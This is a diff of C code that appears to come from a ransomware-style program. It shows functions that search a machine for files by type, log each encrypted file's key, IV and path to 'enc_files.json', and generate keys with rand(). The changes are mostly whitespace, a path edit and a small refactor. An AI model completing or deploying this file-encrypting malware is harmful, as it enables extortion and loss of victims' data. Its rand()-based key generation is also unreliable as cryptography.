@@ -31,7 +31,7 @@ void find_files(List **files, char* start_path){
 
             strcpy(cp, file_types);
             if(ent->d_type == 8){ // it's a file
-                
+
                 char *path_to_file = (char *)malloc(strlen(start_path) + strlen(ent->d_name) + 2);
                 strcpy(path_to_file, start_path);
                 strcat(path_to_file, ent->d_name);
@@ -70,9 +70,9 @@ void find_files(List **files, char* start_path){
  * This file will be used to decrypt.
  * @param l -> type = EncList
  */
-void save_into_file_encrypted_list(EncList *l, char * start_path){ 
+void save_into_file_encrypted_list(EncList *l, char * start_path){
     FILE *f;
-    strcat(start_path, "/Desktop/enc_files.json");
+    strcat(start_path, "enc_files.json");
     f = fopen(start_path, "wb");
     char *line;
     int status;
@@ -96,7 +96,7 @@ void save_into_file_encrypted_list(EncList *l, char * start_path){
 }
 
 /**
- * This function will open the file "enc_files.json" that contains the key, iv 
+ * This function will open the file "enc_files.json" that contains the key, iv
  * and path from each successfull encrypted file on the machine
  * Is used to append to the list all the encrypted files.
  * This list will be used to decrypt the files.
@@ -116,9 +116,9 @@ void read_from_file_encrypted_files(EncList **l, char * start_path){ // funcao p
         f = fopen(start_path, "rb");
         if(f != NULL){
             while ((getline(&line, &len, f)) != -1) {
-                printf("%s", line); // key, iv and path in the line, 
-                
-                
+                printf("%s", line); // key, iv and path in the line,
+
+
                 append_encrypted(l, path, key, iv);
             }
             free(line);
@@ -159,17 +159,18 @@ char * get_start_path(){
 
 /**
  * This function will generate random string to be saved as key and iv.
- * @param length -> type = int 
+ * @param length -> type = int
  * @return -> type = char * (String)
  */
 char* generate_key(int length){
     static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#@$%&(){};'?!";
-    char *randomString = NULL;
+    char *randomString;
+    int key;
     randomString = malloc(sizeof(char) * (length +1));
 
     if (randomString) {
         for (int n = 0;n < length;n++) {
-            int key = rand() % (int)(sizeof(charset) -1);
+            key = rand() % (int)(sizeof(charset) -1);
             randomString[n] = charset[key];
         }
 
